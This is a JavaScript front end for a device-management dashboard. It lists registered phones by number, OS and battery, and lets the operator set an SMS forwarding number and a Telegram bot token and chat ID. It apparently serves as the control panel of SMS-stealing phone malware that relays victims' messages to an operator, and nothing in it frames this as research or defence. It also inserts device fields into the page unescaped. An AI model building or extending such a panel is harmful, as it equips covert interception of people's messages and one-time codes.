// API Base URL
const API_URL = window.location.origin;

// Global variables
let deleteTarget = null;

// Load devices on page load
document.addEventListener('DOMContentLoaded', () => {
    loadDevices();
    // Auto-refresh every 2 seconds
    setInterval(loadDevices, 2000);
});

// Load all devices
async function loadDevices() {
    try {
        const response = await fetch(`${API_URL}/api/devices`);
        const devices = await response.json();
        
        const deviceList = document.getElementById('deviceList');
        
        if (devices.length === 0) {
            deviceList.innerHTML = '<p class="text-center" style="color: var(--text-secondary);">No devices registered yet</p>';
            return;
        }
        
        deviceList.innerHTML = devices.map(device => `
            <div class="device-card" onclick="openDeviceControl('${device.device_id}')">
                <div class="device-header">
                    <div class="device-name">${device.device_name || 'Unknown Device'}</div>
                    <div class="device-status">
                        <span class="status-dot ${device.is_online ? 'online' : 'offline'}"></span>
                        <span>${device.is_online ? 'Online' : 'Offline'}</span>
                    </div>
                </div>
                <div class="device-info">
                    <div>📱 ${device.phone_number || 'No number'}</div>
                    <div>📊 ${device.os_version || 'Unknown OS'}</div>
                    <div>🔋 Battery: ${device.battery_level || 0}%</div>
                </div>
                <div class="delete-icon" onclick="event.stopPropagation(); deleteDevice('${device.device_id}')">🗑️</div>
            </div>
        `).join('');
    } catch (error) {
        console.error('Error loading devices:', error);
    }
}

// Open device control page
function openDeviceControl(deviceId) {
    window.location.href = `device-control.html?device=${deviceId}`;
}

// Delete device
function deleteDevice(deviceId) {
    deleteTarget = { type: 'device', id: deviceId };
    openModal('deleteModal');
}

async function confirmDelete() {
    if (!deleteTarget) return;
    
    try {
        const response = await fetch(`${API_URL}/api/device/${deleteTarget.id}`, {
            method: 'DELETE'
        });
        
        const result = await response.json();
        
        if (result.status === 'success') {
            showSuccess('Device deleted successfully!');
            loadDevices();
        }
    } catch (error) {
        console.error('Error deleting device:', error);
    }
    
    closeModal('deleteModal');
    deleteTarget = null;
}

// Update forwarding number
function openForwardingModal() {
    openModal('forwardingModal');
}

async function updateForwarding() {
    const forwardNumber = document.getElementById('forwardNumber').value;
    
    if (!forwardNumber) {
        alert('Please enter a forwarding number');
        return;
    }
    
    try {
        const response = await fetch(`${API_URL}/api/config/sms_forward`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ forward_number: forwardNumber })
        });
        
        const result = await response.json();
        
        if (result.status === 'success') {
            showSuccess('Forwarding number updated successfully!');
            document.getElementById('forwardNumber').value = '';
        }
    } catch (error) {
        console.error('Error updating forwarding number:', error);
    }
    
    closeModal('forwardingModal');
}

// Update Telegram details
function openTelegramModal() {
    openModal('telegramModal');
}

async function updateTelegram() {
    const token = document.getElementById('telegramToken').value;
    const chatId = document.getElementById('telegramChatId').value;
    
    if (!token || !chatId) {
        alert('Please enter both bot token and chat ID');
        return;
    }
    
    try {
        const response = await fetch(`${API_URL}/api/config/telegram`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                telegram_bot_token: token,
                telegram_chat_id: chatId
            })
        });
        
        const result = await response.json();
        
        if (result.status === 'success') {
            showSuccess('Telegram details updated successfully!');
            document.getElementById('telegramToken').value = '';
            document.getElementById('telegramChatId').value = '';
        }
    } catch (error) {
        console.error('Error updating Telegram details:', error);
    }
    
    closeModal('telegramModal');
}

// Modal functions
function openModal(modalId) {
    document.getElementById(modalId).classList.add('active');
}

function closeModal(modalId) {
    document.getElementById(modalId).classList.remove('active');
}

function showSuccess(message) {
    document.getElementById('successMessage').textContent = message;
    openModal('successModal');
}
